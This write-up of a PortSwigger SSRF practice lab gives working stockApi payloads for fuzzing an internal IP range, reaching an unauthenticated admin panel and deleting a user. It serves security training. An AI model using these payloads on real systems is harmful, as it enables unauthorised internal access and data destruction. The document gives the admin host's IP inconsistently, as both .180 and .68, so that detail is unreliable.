# Basic SSRF Against Another Back-End System

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Scan the internal `192.168.0.X` range for an admin interface on port `8080`, then delete the user `carlos`.

---

## Lab

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

---

## OWASP Category

A10:2021 – Server-Side Request Forgery (SSRF)

---

## Core Concept

Internal back-end systems often have:
- No authentication (they trust only internal network access)
- Private IP addresses like `192.168.0.x` not reachable from internet
- Sensitive admin functionality

Using SSRF we make the **app server** (which IS on the internal network) reach these private systems on our behalf.

```
Internet → App Server (192.168.0.1) → Internal Admin (192.168.0.68:8080)
                 ↑                              ↑
        We can reach this               We CANNOT reach this directly
        but it can reach →              but app server CAN
```

---

## Steps to Solve

---

**Step 1 — Find the SSRF Injection Point**

Intercept the stock check request:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D1%26storeId%3D1
```

`stockApi` is our injection point.

<img width="911" height="376" alt="image" src="https://github.com/user-attachments/assets/ebaacaf2-1d6e-4319-8d6c-dee726a879e1" />

---

**Step 2 — Scan Internal IP Range with ZAP Fuzzer**

We need to find which `192.168.0.X` host has the admin interface on port 8080.

Set payload in `stockApi`:

```
stockApi=http://192.168.0.§1§:8080/admin
```

**ZAP Fuzzer Setup:**

Mark `§1§` as payload position.

Payload type: `Numberzz`
```
Start: 1
End: 255
Increment: 1
```

Start fuzzer and sort by **Size Resp. Body** — the response with different size = admin found ✅

<img width="1895" height="325" alt="image" src="https://github.com/user-attachments/assets/54ee673e-1d20-4b2b-a601-291493f1d728" />

<img width="1897" height="628" alt="image" src="https://github.com/user-attachments/assets/1ecb4249-1405-41c7-9e21-f22d00ce71fa" />

---

**Step 3 — Access the Admin Interface**

Use the IP found by fuzzer (e.g. `192.168.0.180`):

```http
stockApi=http://192.168.0.180:8080/admin
```

Admin panel HTML returned in response.

<img width="997" height="465" alt="image" src="https://github.com/user-attachments/assets/a4539671-b068-428e-a2a0-f3272f6dc678" />

---

**Step 4 — Delete Carlos**

Find the delete link in response HTML and use it:

```http
stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
```

<img width="911" height="232" alt="image" src="https://github.com/user-attachments/assets/934a5545-2dc8-4d3f-8993-fd9e28178f33" />

---

**Lab Solved**

<img width="1514" height="676" alt="image" src="https://github.com/user-attachments/assets/3ab41cac-ec7b-4345-8f15-f50c4d12474f" />

---

## Key Difference from Lab 1

| | Lab 1 | Lab 2 |
|--|--|--|
| Target | `localhost` (same server) | `192.168.0.X` (different internal server) |
| Trust reason | Loopback = trusted | Internal network = no auth needed |
| Need to scan | No | Yes — IP is unknown |
| Port | Default 80 | Custom 8080 |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
